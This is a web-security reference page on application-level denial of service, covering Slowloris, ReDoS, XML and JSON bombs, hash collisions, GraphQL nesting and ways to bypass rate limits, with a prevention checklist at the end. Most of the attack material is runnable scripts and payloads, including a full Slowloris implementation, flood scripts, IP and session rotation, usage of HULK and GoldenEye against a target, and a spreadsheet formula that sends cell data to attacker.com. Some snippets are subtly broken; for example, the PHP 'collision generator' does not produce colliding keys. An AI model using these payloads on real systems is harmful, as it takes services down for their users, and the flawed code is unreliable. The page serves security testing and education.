---
title: Denial of Service (DOS)
---

# Denial of Service (DOS)

# Application-Level Denial of Service

Application-Level Denial of Service (DoS) is a web security vulnerability that exploits the logic, features, or resource consumption patterns of web applications to exhaust server resources, degrade performance, or completely crash the service. Unlike network-layer DDoS attacks that flood bandwidth, application-layer DoS targets specific application weaknesses using seemingly legitimate requests that consume disproportionate server resources (CPU, memory, database connections, disk I/O). These attacks are particularly dangerous because they can be executed with minimal bandwidth, are harder to detect, and often bypass traditional network security controls.

## Types of Application-Level DoS Attacks

### 1. Resource Exhaustion Attacks

Exploit CPU, memory, or database resources through computationally expensive operations. Force server to perform intensive calculations, complex queries, or memory allocation. Can be triggered with single or minimal requests. Often target regex processing, image manipulation, encryption, or data parsing.

**Example:**

```
POST /api/process
Content-Type: application/json

{
  "data": "AAAAAAAAAA...[10MB of data]",
  "iterations": 999999999
}
```

### **2. Algorithmic Complexity Attacks**

Exploit worst-case algorithm behavior (O(n²), O(n³), or exponential time complexity). Target sorting, searching, parsing, or validation routines. Degrade performance from milliseconds to hours with crafted input. ReDoS (Regular Expression DoS) is a primary subcategory.

**Example - ReDoS:**

```
POST /validate
email=(a+)+@example.com
# Causes catastrophic backtracking in regex pattern
```

### **3. Slow HTTP Attacks**

- **Slowloris:** Opens many connections, sends partial HTTP headers slowly to keep connections alive
- **Slow POST:** Sends HTTP POST body at extremely slow rate (1 byte/10 seconds)
- **Slow Read:** Reads server response slowly by advertising small TCP receive window
- Exhausts connection pool without consuming bandwidth

**Example - Slowloris:**

```
GET / HTTP/1.1\r\n
Host: target.com\r\n
User-Agent: Mozilla/5.0\r\n
[Wait 10 seconds]
X-Custom: value1\r\n
[Wait 10 seconds]
X-Custom: value2\r\n
[Repeat until timeout]
```

### **4. Application Logic Abuse**

Exploits business logic flaws requiring excessive processing. Trigger resource-intensive workflows through normal application features. Examples: mass email generation, bulk PDF creation, complex report generation. Legitimate requests that overwhelm backend systems.

**Example:**

```
POST /generate-report
{
  "start_date": "1900-01-01",
  "end_date": "2026-12-31",
  "include_all_fields": true,
  "format": "pdf"
}
```

### **5. Hash Collision DoS**

- Exploits predictable hash functions in hash tables
- Sends keys designed to collide in same bucket
- Degrades O(1) lookup to O(n) or worse
- Affects POST parameter parsing, JSON processing, session storage

**Example:**

- **PHP (DJBX33A hash):**

The strings `"Ez"` and `"FY"` produce the same hash. Concatenating them generates exponentially large collision sets:

```
POST /submit.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

EzEzEzEz=x&EzEzEzFY=x&EzEzFYEz=x&EzEzFYFY=x&EzFYEzEz=x&...[65,536 keys]
```

- **Java (`String.hashCode()`):**

`"Aa"` and `"BB"` both produce hashCode `2112`. Combinations like `"AaAa"`, `"AaBB"`, `"BBAa"`, `"BBBB"` all collide:

```
POST /api/data HTTP/1.1
Content-Type: application/json

{"AaAaAaAa":1,"AaAaAaBB":1,"AaBBAaAa":1,"AaBBBBBB":1,...[65,536 colliding keys]}
```

### **6. XML/JSON Bomb Attacks**

- **Billion Laughs Attack (XML):** Nested entity expansion consuming exponential memory
- **JSON Depth Attack:** Deeply nested JSON objects exhausting parser stack
- **XML External Entity (XXE) DoS:** Forces parser to resolve massive external entities
- Exploits recursive processing in parsers

**Example - XML Bomb:**

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- Continue nesting... -->
]>
<lolz>&lol9;</lolz>
```

### **7. Database Query DoS**

- Crafted inputs forcing expensive database operations
- Unoptimized queries, missing indexes, full table scans
- Cartesian joins, recursive queries, or complex aggregations
- Exhausts database connections or locks tables

**Example:**

```
GET /search?q=%25&sort=random&limit=999999
# Forces full table scan with random sorting
```

### **8. File Upload DoS**

- Upload extremely large files to exhaust disk space
- Upload specially crafted files (zip bombs, decompression bombs)
- Trigger virus scanning or image processing on malicious files
- Filename length attacks, path traversal combined with storage exhaustion

**Example - Zip Bomb:**

```
Upload: 42.zip (42 KB compressed → 4.5 PB uncompressed)
```

## **Attack Surfaces**

### **API Endpoints**

APIs often lack rate limiting and accept complex inputs that trigger resource-intensive operations. Common vulnerable patterns:

- Search/filter endpoints with unlimited result sets
- Bulk operations (batch create, mass update, export all)
- File processing endpoints (upload, convert, compress)
- Aggregation/analytics endpoints
- Webhook/callback URLs that can be spammed

**Testing approach:**

```
POST /api/v1/users/bulk-create
{
  "users": [
    {"name": "user1", ...},
    {"name": "user2", ...},
    ... [repeat 100,000 times]
  ]
}
```

### **Authentication Endpoints**

Login, registration, and password reset forms are prime DoS targets. Attack vectors:

- Expensive password hashing algorithms (bcrypt with high cost factor)
- Account enumeration through timing attacks
- Email/SMS verification triggering external service calls
- CAPTCHA solving consuming third-party API quotas

**Testing approach:**

```
# Trigger expensive bcrypt operations
for i in {1..1000}; do
  curl -X POST https://target.com/login \
    -d "username=test$i&password=$(head -c 1000 /dev/urandom | base64)"
done
```

### **Search Functionality**

Search features process user queries against large datasets. Vulnerable patterns:

- Wildcard searches (`%`, ) without length restrictions
- Regex-based search without timeout
- Unindexed database columns
- Full-text search on large text fields
- No result limit enforcement

**Testing approach:**

```
GET /search?q=%25&category=all&sort=relevance&page=1&limit=999999999
GET /search?q=(a+)+b&type=regex
```

### **File Upload Handlers**

File processing operations are computationally expensive. Attack vectors:

- Image resizing/thumbnail generation
- Document format conversion (PDF, DOCX to HTML)
- Virus/malware scanning
- Metadata extraction
- Video transcoding, audio processing

**Testing approach:**

```
# Create 1GB file
dd if=/dev/zero of=large.jpg bs=1M count=1024

# Upload decompression bomb
curl -X POST https://target.com/upload \
  -F "file=@42.zip"
```

### **WebSocket Connections**

WebSockets maintain persistent connections consuming server resources. Attack vectors:

- Open maximum connections without sending data
- Send high-frequency messages
- Send large message frames
- Trigger broadcast messages to all connected clients

**Testing approach:**

```
// Open 10,000 WebSocket connections
for (let i = 0; i < 10000; i++) {
  let ws = new WebSocket('wss://target.com/chat');
  ws.onopen = () => {
    // Keep alive without useful data
    setInterval(() => ws.send('ping'), 30000);
  };
}
```

### **GraphQL Endpoints**

GraphQL allows deeply nested queries and batching. Vulnerable patterns:

- Circular query relationships
- Unbounded depth/complexity
- Field duplication
- Batch query abuse
- Expensive resolver functions

**Testing approach:**

```
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              # ... nest 50 levels deep
            }
          }
        }
      }
    }
  }
}
```

### **Webhook/Callback URLs**

Applications accepting callback URLs for notifications. Attack vectors:

- Specify slow-responding servers
- Point to internal services (SSRF + DoS combination)
- Trigger infinite callback loops
- Specify non-existent hosts causing DNS timeout

**Testing approach:**

```
POST /api/subscribe
{
  "callback_url": "http://10.255.255.1:81/callback",
  "events": ["user.created", "user.updated", "user.deleted"]
}
```

### **Email/Notification Systems**

Features triggering email or SMS delivery. Attack vectors:

- Mass invitation systems
- "Send to friend" features
- Newsletter subscriptions
- Password reset floods
- Notification preferences abuse

**Testing approach:**

```
POST /invite-users
{
  "emails": [
    "user1@example.com",
    "user2@example.com",
    ... [10,000 emails]
  ],
  "message": "Join our platform!"
}
```

### **Export/Report Generation**

Features that generate large reports or data exports. Vulnerable patterns:

- No time range restrictions
- CSV/Excel generation for unlimited rows
- PDF generation with complex layouts
- Uncompressed data exports
- Synchronous processing blocking requests

**Testing approach:**

```
GET /export/transactions?format=pdf&start_date=1900-01-01&end_date=2026-12-31&include_attachments=true
```

## **Exploitation and Bypassing Defenses**

### **Rate Limiting Bypass Techniques**

**IP Rotation:**

```
# Use proxy chains or cloud providers
for ip in $(cat proxy_list.txt); do
  curl -x $ip https://target.com/expensive-endpoint
done
```

**Header Manipulation:**

```
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12
X-Remote-IP: 13.14.15.16
X-Client-IP: 17.18.19.20
```

**Session/Token Rotation:**

```
for i in range(10000):
    session = requests.Session()
    session.post('https://target.com/register', data={
        'username': f'user{i}',
        'email': f'user{i}@temp-mail.com'
    })
    session.post('https://target.com/expensive-operation')
```

**Parameter Pollution:**

```
POST /api/process?action=heavy&action=light
# Some frameworks process first, some last, some all
```

**Case Sensitivity Bypass:**

```
/API/endpoint (if rate limit is on /api/endpoint)
/api/Endpoint
/api/endpoint?dummy=1
```

### **ReDoS (Regular Expression DoS)**

**Vulnerable Regex Patterns:**

```
(a+)+b          # Catastrophic backtracking
(a*)*b
(a|a)*b
(a|ab)*c
([a-zA-Z]+)*
^(a+)+$
```

**Exploitation:**

```
import requests

# Target vulnerable email validation endpoint
payload = {
    'email': 'a' * 50000 + '@example.com'
}

# This causes exponential backtracking
requests.post('https://target.com/validate', json=payload)
```

**Real-World Example:**

```
# Vulnerable regex: ^([a-z]+)+$
Input: "aaaaaaaaaaaaaaaaaaaaaaaX"
# Tries exponential combinations before failing
```

### **Hash Collision Attacks**

**Generating Colliding Keys (PHP Example):**

```
# PHP hash function collision generator
def generate_colliding_keys(count):
    keys = []
    base = 0
    for i in range(count):
        # Keys that hash to same bucket in PHP
        keys.append(f"key_{base + i * 2^16}")
    return keys

# Send colliding POST parameters
data = '&'.join([f'{k}=value' for k in generate_colliding_keys(10000)])
requests.post('https://target.com/form', data=data)
```

**JSON Hash Collision:**

```
{
  "Aa": 1, "BB": 2,
  // These hash to same value in Java
  // Degrades O(1) to O(n)
}
```

### **XML/JSON Bomb Exploitation**

**Billion Laughs Attack:**

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

**JSON Depth Bomb:**

```
{
  "a": {
    "a": {
      "a": {
        // ... nest 10,000 levels deep
      }
    }
  }
}
```

**Quadratic Blowup (JSON):**

```
["a", "a", "a", ... repeat 100,000 times]
// Forces parser to reallocate array multiple times
```

### **Slow HTTP Attacks**

**Slowloris Implementation:**

```
import socket
import time

def slowloris(target, port, connections=200):
    sockets = []

    for _ in range(connections):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(f"Host:{target}\r\n".encode())
        sockets.append(s)

    while True:
        for s in sockets:
            try:
                s.send(b"X-Custom: keep-alive\r\n")
            except:
                # Reconnect if socket closed
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
        time.sleep(15)

slowloris('target.com', 80)
```

**Slow POST Attack:**

```
import requests

# Send POST body 1 byte every 10 seconds
def slow_post(url):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '1000000'
    }

    def data_generator():
        for i in range(1000000):
            yield b'A'
            time.sleep(10)

    requests.post(url, headers=headers, data=data_generator())

slow_post('https://target.com/upload')
```

### **Encoding and Obfuscation**

**Unicode Normalization Exploits:**

```
# Send different Unicode representations
Username: admin (U+0061 U+0064 U+006D U+0069 U+006E)
Username: admin (U+FF41 U+FF44 U+FF4D U+FF49 U+FF4E) # Fullwidth
# May bypass rate limiting if normalized later
```

**Parameter Encoding Variations:**

```
POST /api/action
action=delete
action%3Ddelete
action=delete%00
action[]=delete
action.value=delete
```

**JSON Obfuscation:**

```
{
  "data": "\u0041\u0041\u0041...",  // Encoded long string
  "\u0075\u0073\u0065\u0072": "admin"  // Encoded key
}
```

## **Advanced Attack Scenarios**

### **1. GraphQL Query Complexity DoS**

**Scenario:** A GraphQL API allows nested queries without depth or complexity limits, enabling attackers to craft exponentially expensive queries.

**Vulnerable Query:**

```
query EvilQuery {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  # ... continue nesting
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Batch Query Abuse:**

```
query {
  user1: user(id: 1) { ...ExpensiveFragment }
  user2: user(id: 2) { ...ExpensiveFragment }
  # ... repeat 1000 times with aliases
}
```

**Impact:** Single request generates millions of database queries, memory exhaustion from result set accumulation, complete API unavailability within seconds.

### **2. Image Processing DoS via Pixel Flood**

**Scenario:** Image upload endpoint resizes images to create thumbnails without dimension validation.

**Attack Methodology:**

```
from PIL import Image

# Create 100,000 x 100,000 pixel image (minimal file size)
img = Image.new('RGB', (100000, 100000), color='white')
img.save('pixel_flood.jpg', quality=1)

# Server attempts to load and resize
# Memory required: 100000 * 100000 * 3 bytes = 30GB
```

**Decompression Bomb:**

```
# Create 10,000 x 10,000 white PNG (compresses to ~100KB)
convert -size 10000x10000 xc:white bomb.png

# Upload to trigger decompression + processing
curl -F "image=@bomb.png" https://target.com/upload
```

### **3. PDF Generation Resource Exhaustion**

**Scenario:** Report generation feature converts HTML to PDF without resource limits.

**Exploitation:**

```
POST /generate-invoice
{
  "items": [
    // Repeat 100,000 times
    {"name": "Product", "description": "<p>" + "X" * 10000 + "</p>"}
  ],
  "include_images": true,
  "format": "pdf"
}
```

**SVG Rendering DoS:**

```
<!-- Inject into PDF template -->
<svg width="1000" height="1000">
  <foreignObject width="100%" height="100%">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <!-- Deeply nested divs -->
      <div><div><div>...[10000 levels]...</div></div></div>
    </div>
  </foreignObject>
</svg>
```

### **4. WebSocket Message Flood**

**Scenario:** Real-time chat application broadcasts messages to all connected users without throttling.

**Attack Script:**

```
const ws = new WebSocket('wss://target.com/chat');

ws.onopen = () => {
  // Send 10,000 messages per second
  setInterval(() => {
    for(let i = 0; i < 10000; i++) {
      ws.send(JSON.stringify({
        type: 'broadcast',
        message: 'A'.repeat(64000)  // Max frame size
      }));
    }
  }, 1000);
};
```

**Impact:** Server broadcasts message to all N connected users, O(N) amplification per message, network and CPU exhaustion.

### **5. Database Connection Pool Exhaustion**

**Scenario:** Long-running queries hold database connections, exhausting the pool.

**Exploitation:**

```
import threading
import requests

def slow_query():
    # Trigger query with SLEEP function
    requests.get('https://target.com/search?q=test&sort=SLEEP(30)')

# Open 100 threads (if pool size = 100)
threads = []
for i in range(100):
    t = threading.Thread(target=slow_query)
    t.start()
    threads.append(t)

# All subsequent requests will queue or timeout
```

**SQL Injection to DoS:**

```
# Even without data extraction, cause resource exhaustion
UNION SELECT * FROM large_table CROSS JOIN large_table CROSS JOIN large_table;
```

### **6. Cache Bypass DoS**

**Scenario:** Application uses cache but allows bypass via query parameters.

**Exploitation:**

```
# Generate unique URLs bypassing cache
for i in {1..100000}; do
  curl "https://target.com/expensive-page?cachebuster=$RANDOM"
done
```

**Vary Header Abuse:**

```
GET /page HTTP/1.1
Host: target.com
User-Agent: UniqueAgent-$RANDOM
Accept-Language: en-US-$RANDOM
# Each variation creates separate cache entry
```

### **7. Template Injection DoS**

**Scenario:** Server-side template engine processes user input without sandboxing.

**Jinja2 DoS:**

```
# Payload causing infinite loop
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].setrecursionlimit(999999999) }}
{{ range(999999999999) }}
```

**Freemarker DoS:**

```
<#list 1..999999999 as i>${i}</#list>
```

### **8. OAuth/OIDC Redirect DoS**

**Scenario:** OAuth callback endpoint fetches user info from authorization server.

**Exploitation:**

```
# Create fake authorization server that responds slowly
from flask import Flask
import time

app = Flask(__name__)

@app.route('/userinfo')
def userinfo():
    time.sleep(300)  # Hold connection for 5 minutes
    return {"sub": "user"}

# Trigger OAuth flow pointing to slow server
```

### **9. LDAP/AD Query DoS**

**Scenario:** Application performs LDAP searches based on user input.

**Wildcard Injection:**

```
username=*)(objectClass=*
# Causes LDAP server to return all objects
```

**Complex Filter:**

```
(|(cn=*a*)(cn=*b*)(cn=*c*)...(cn=*z*))
# Forces multiple subtree searches
```

### **10. CSV Injection Leading to DoS**

**Scenario:** Spreadsheet application processes formulas in CSV uploads.

**Exploitation:**

```
=1+1+1+1+...[repeat 100000 times]
=IMPORTXML("http://slow-server.com/data")
=WEBSERVICE("http://attacker.com/"&A1&A2&A3...)
```

**Impact:** Excel/LibreOffice hangs during import attempting to evaluate complex formulas.

## **Framework-Specific Scenarios**

### **1. Node.js / Express**

**Event Loop Blocking:**

```
// Vulnerable endpoint
app.get('/compute', (req, res) => {
  let result = 0;
  for(let i = 0; i < req.query.iterations; i++) {
    result += Math.sqrt(i);
  }
  res.send(`Result:${result}`);
});

// Attack
GET /compute?iterations=999999999999
```

**ReDoS in Routes:**

```
// Vulnerable regex in route
app.get(/^\/user\/([a-z]+)+$/, (req, res) => {
  // Handler
});

// Attack URL
GET /user/aaaaaaaaaaaaaaaaaaaaaaaaaaX
```

### **2. Python / Django**

**Queryset DoS:**

```
# Vulnerable view
def search(request):
    query = request.GET.get('q')
    results = Model.objects.filter(name__icontains=query)
    return render(request, 'results.html', {'results': results})

# Attack
GET /search?q=%  # Full table scan without limit
```

**Template Rendering DoS:**

```
# Vulnerable template with user input
{{ user_input|safe }}

# Inject deeply nested template syntax
{% for i in range(999999999) %}{{ i }}{% endfor %}
```

### **3. Java / Spring Boot**

**Jackson JSON Bomb:**

```
// Vulnerable deserialization
@PostMapping("/api/data")
public void process(@RequestBody Map<String, Object> data) {
    // Processes deeply nested JSON
}

// Attack payload
{ "a": { "a": { "a": { ... [10000 levels] } } } }
```

**HikariCP Pool Exhaustion:**

```
// Long transaction holds connection
@Transactional
public void processData(String input) {
    // Trigger slow query
    jdbcTemplate.query("SELECT SLEEP(30)", ...);
}
```

### **4. Ruby / Rails**

**ActiveRecord N+1 DoS:**

```
# Vulnerable controller
def index
  @users = User.all
  # View accesses user.posts for each user (N+1)
end

# Attack: Create thousands of users
# Each page load triggers thousands of queries
```

**Symbol DoS (older Rails):**

```
# Symbols aren't garbage collected in Ruby < 2.2
params[:user][:some_dynamic_key]

# Attack: Send unique keys
POST /users with user[key_1]=value, user[key_2]=value, ...
# Memory grows until crash
```

### **5. PHP**

**PHP Hash Collision:**

```
// Vulnerable $_POST processing
foreach($_POST as $key => $value) {
    // Process
}

// Attack: Send colliding keys
POST with key1=val&key2=val&...[10000 colliding keys]
```

**Session File Flood:**

```
// Each session creates file
session_start();

// Attack: Create millions of sessions
for i in {1..1000000}; do
  curl -c /dev/null https://target.com/
done
# Exhausts inodes or disk space
```

## **Detection Techniques**

### **Manual Testing Methodology**

**1. Resource Consumption Analysis:**

```
**# Baseline measurement**
time curl https://target.com/api/search?q=test

**# Test with suspicious input**
time curl https://target.com/api/search?q=$(python -c 'print("a"*10000)')

# Monitor CPU/memory during request
htop # or similar monitoring tool
```

**2. Response Time Profiling:**

```
import requests
import time

def profile_endpoint(url, payloads):
    results = []
    for payload in payloads:
        start = time.time()
        response = requests.get(url, params=payload)
        duration = time.time() - start
        results.append({
            'payload': payload,
            'duration': duration,
            'status': response.status_code
        })
    return results

# Test increasing complexity
payloads = [
    {'q': 'a'},
    {'q': 'a' * 100},
    {'q': 'a' * 1000},
    {'q': 'a' * 10000},
]

results = profile_endpoint('https://target.com/search', payloads)
```

**3. Connection Limit Testing:**

```
**# Test max concurrent connections**
ab -n 10000 -c 1000 https://target.com/

**# Monitor connection exhaustion**
netstat -an | grep ESTABLISHED | wc -l
```

**4. ReDoS Pattern Detection:**

```
**# Test regex endpoints with crafted inputs**
import requests
test_cases = [
    'a' * 10,
    'a' * 20,
    'a' * 30,
    'a' * 40,
]
for test in test_cases:
    start = time.time()
    requests.post('https://target.com/validate', json={'email': test + 'X'})
    print(f"Length{len(test)}:{time.time() - start}s")

# Exponential growth indicates ReDoS
```

**5. File Upload Bomb Testing:**

```
**# Create test files of increasing size**
dd if=/dev/zero of=test_1mb.bin bs=1M count=1
dd if=/dev/zero of=test_10mb.bin bs=1M count=10
dd if=/dev/zero of=test_100mb.bin bs=1M count=100

**# Upload and monitor server behavior**
curl -F "file=@test_100mb.bin" https://target.com/upload
```

### **Automated Testing Tools**

**1. Slowloris:**

```
**# Installation**
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

**# Basic usage**
python3 slowloris.py target.com

**# Advanced usage**
python3 slowloris.py target.com -s 500 -p 443 --https
```

**2. Hulk (HTTP Unbearable Load King):**

```
**# Clone repository**
git clone https://github.com/grafov/hulk.git

**# Run attack**
python hulk.py https://target.com
```

**3. GoldenEye:**

```
**# Download**
wget https://github.com/jseidl/GoldenEye/raw/master/goldeneye.py

**# HTTP DoS test**
python goldeneye.py https://target.com -w 50 -s 100
```

**4. Custom Automation with Python:**

```
import requests
import concurrent.futures
import time

def dos_test(url, method='GET', data=None, iterations=1000):
    """
    Test endpoint for DoS vulnerability
    """
    def single_request():
        try:
            if method == 'GET':
                return requests.get(url, timeout=30)
            else:
                return requests.post(url, json=data, timeout=30)
        except Exception as e:
            return None

    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(single_request) for _ in range(iterations)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    duration = time.time() - start_time
    success_count = len([r for r in results if r and r.status_code == 200])

    print(f"Completed{iterations} requests in{duration:.2f}s")
    print(f"Success rate:{success_count}/{iterations}")
    print(f"Requests/sec:{iterations/duration:.2f}")

# Test example
dos_test('https://target.com/api/expensive-operation', iterations=5000)
```

**5. Apache JMeter:**

```
<!-- Thread Group for load testing -->
<ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="DoS Test">
  <intProp name="ThreadGroup.num_threads">1000</intProp>
  <intProp name="ThreadGroup.ramp_time">10</intProp>
  <longProp name="ThreadGroup.duration">60</longProp>
</ThreadGroup>

<!-- HTTP Request -->
<HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy">
  <stringProp name="HTTPSampler.domain">target.com</stringProp>
  <stringProp name="HTTPSampler.path">/api/search</stringProp>
  <stringProp name="HTTPSampler.method">POST</stringProp>
</HTTPSamplerProxy>
```

**6. Vegeta (HTTP load testing):**

```
# Install
go get -u github.com/tsenart/vegeta

# Create targets file
echo "GET https://target.com/expensive" > targets.txt

# Attack for 30 seconds at 1000 req/sec
vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report
```

## Impact

- Application becomes completely unresponsive → legitimate users locked out → business operations halt → direct revenue loss from downtime.
- Response times degrade from milliseconds to minutes → user frustration spikes → abandoned transactions → permanent brand reputation damage.
- Auto-scaling triggers runaway resource allocation → cloud costs explode exponentially → budget crisis even without complete outage.
- Long-running queries lock database tables → write operations queue indefinitely → data inconsistency → potential database corruption requiring rollback.
- Overloaded service crashes dependent microservices → cascading failures across platform → entire infrastructure collapse → hours of recovery time.
- Service availability drops below SLA guarantees → contractual penalty payments → customer contract terminations → legal liability exposure.
- Logging systems overwhelmed by attack traffic → legitimate security alerts buried → incident response delayed → parallel attacks go completely undetected.
- Memory exhaustion triggers application crashes → in-memory session data lost → active transactions rolled back → customer data corruption.
- Outages during critical business periods (Black Friday, product launches) → customers permanently switch to competitors → irreversible market share loss.
- Extended downtime violates data availability regulations → GDPR/HIPAA compliance violations → regulatory fines → mandatory security audits.

---

## Prevention

- Enforce strict input validation — limit query length to 1000 chars, file uploads to 10MB, JSON nesting to 10 levels maximum.
- Implement rate limiting at every layer — 100 requests/minute per IP, 10 concurrent connections per user, token bucket for API endpoints.
- Set aggressive timeouts everywhere — 30 seconds for HTTP requests, 5 seconds for database queries, 10 seconds for regex operations.
- Configure connection pool limits — max 20 database connections, max 10 overflow, 30-second pool timeout, 1-hour connection recycle.
- Enforce pagination on all list endpoints — default 20 items, maximum 100 per page, reject unlimited result requests.
- Disable GraphQL introspection in production — limit query depth to 5 levels, set complexity budget to 1000, reject batch queries over 10.
- Validate file uploads aggressively — reject files over 10MB, limit image dimensions to 10000×10000, set PIL max pixels to 100 megapixels.
- Disable XML external entities completely — turn off entity expansion, reject DOCTYPE declarations, use defusedxml for all parsing.
- Deploy WAF with DoS rules — ModSecurity for rate limiting, Cloudflare for DDoS protection, reject slow HTTP attacks at edge.
- Implement caching at every layer — CDN for static assets, Redis for expensive queries, HTTP cache headers for 1-hour TTL.
- Use safe regex patterns only — avoid nested quantifiers `(a+)+`, set timeout wrappers, test patterns against ReDoS checkers before deployment.
- Containerize with resource limits — Docker memory limit 512MB, CPU limit 0.5 cores, use Kubernetes resource quotas for pods.
- Monitor system metrics continuously — alert on CPU >80%, memory >85%, connections >1000, response time >5 seconds.
- Enable query timeouts in all ORMs — Django `CONN_MAX_AGE`, SQLAlchemy `pool_timeout`, ActiveRecord `checkout_timeout`.
- Lock down actuator endpoints — expose only `/health`, require authentication for everything else, or disable completely in production.

---

## Tools

| **Tool** | **Purpose** |
| --- | --- |
| [Slowloris](https://github.com/gkbrk/slowloris) | Slow HTTP header attack testing |
| [HULK](https://github.com/grafov/hulk) | HTTP Unbearable Load King DoS tester |
| [GoldenEye](https://github.com/jseidl/GoldenEye) | HTTP/HTTPS DoS attack simulator |
| [Apache Bench (ab)](https://httpd.apache.org/docs/2.4/programs/ab.html) | Simple load testing and benchmarking |
| [wrk](https://github.com/wrs/wrk) | High-performance HTTP benchmarking |
| [Locust](https://github.com/locustio/locust) | Python-based load testing framework |
| [JMeter](https://jmeter.apache.org/) | Java-based load and performance testing |
| [Vegeta](https://github.com/tsenart/vegeta) | HTTP load testing tool in Go |
| [Prometheus](https://prometheus.io/) | System monitoring and alerting |
| [Grafana](https://grafana.com/) | Metrics visualization and dashboards |
| [Elasticsearch](https://www.elastic.co/) | Log aggregation and attack detection |
| [psutil](https://github.com/giampaolo/psutil) | Python system monitoring library |

---

## Good to Read

- [OWASP — Denial of Service Attacks](https://owasp.org/www-community/attacks/Denial_of_Service)
- [PortSwigger — Denial-of-Service Vulnerabilities](https://portswigger.net/web-security/denial-of-service)
- [Cloudflare — Application Layer DDoS Attack](https://www.cloudflare.com/learning/ddos/application-layer-ddos-attack/)
- [Bugcrowd — Application-Level Denial-of-Service (DoS)](https://www.bugcrowd.com/glossary/application-level-denial-of-service-dos/)
- [OWASP — Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [Scott A. Crosby — Denial of Service via Algorithmic Complexity Attacks](https://www.usenix.org/legacy/events/sec03/tech/full_papers/crosby/crosby.pdf)
- [OWASP — Regular Expression Denial of Service (ReDoS)](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
- [Qualys — Slow HTTP DoS Attacks](https://www.qualys.com/2011/08/31/slowloris/slowloris.pdf)
- [Akamai — State of the Internet Security Report](https://www.akamai.com/resources/state-of-the-internet-security)
- [Apollo GraphQL — Security Best Practices](https://www.apollographql.com/docs/apollo-server/security/authentication/)
- [HackerOne — GraphQL DoS Reports](https://hackerone.com/hacktivity)
- [NETSCOUT — Application Layer DDoS Attacks](https://www.netscout.com/what-is-ddos/application-layer-attacks)

## References

- [https://www.bugcrowd.com/glossary/application-level-denial-of-service-dos/](https://www.bugcrowd.com/glossary/application-level-denial-of-service-dos/)
- [https://owasp.org/www-community/attacks/Denial_of_Service](https://owasp.org/www-community/attacks/Denial_of_Service)
- [https://portswigger.net/web-security/denial-of-service](https://portswigger.net/web-security/denial-of-service)
- [https://cloudflare.com/learning/ddos/application-layer-ddos-attack/](https://cloudflare.com/learning/ddos/application-layer-ddos-attack/)
- [https://netscout.com/what-is-ddos/application-layer-attacks](https://netscout.com/what-is-ddos/application-layer-attacks)
- [https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [https://www.acunetix.com/blog/articles/application-layer-ddos-attacks/](https://www.acunetix.com/blog/articles/application-layer-ddos-attacks/)
- [https://nvd.nist.gov/](https://nvd.nist.gov/) (CVE Database)
- [https://hackerone.com/hacktivity](https://hackerone.com/hacktivity) (Real-world DoS reports)
- [https://github.com/OWASP/CheatSheetSeries](https://github.com/OWASP/CheatSheetSeries)